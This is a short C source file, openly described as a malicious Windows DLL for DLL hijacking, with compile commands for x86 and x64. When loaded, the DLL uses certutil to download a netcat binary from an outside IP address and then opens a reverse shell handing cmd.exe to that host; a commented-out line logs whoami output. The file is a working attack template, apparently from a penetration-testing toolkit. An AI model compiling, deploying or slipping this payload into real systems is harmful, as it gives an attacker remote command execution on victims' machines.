// This is a malicious DLL that can be used to execute arbitrary commands on the local system
// If you are replacing a missing DLL in a writable directory, this dll must have the same name as the missing library!

// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
    system("certutil -urlcache -f http://10.2.5.182:8082/nc64.exe C:\\Temp\\nc64.exe");		// Make sure that these addreses/paths are correct
    system("C:\\Temp\\nc64.exe -e cmd.exe 10.2.5.182 4445");            			// This is the line that executes the malicious command(s)
    // system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}

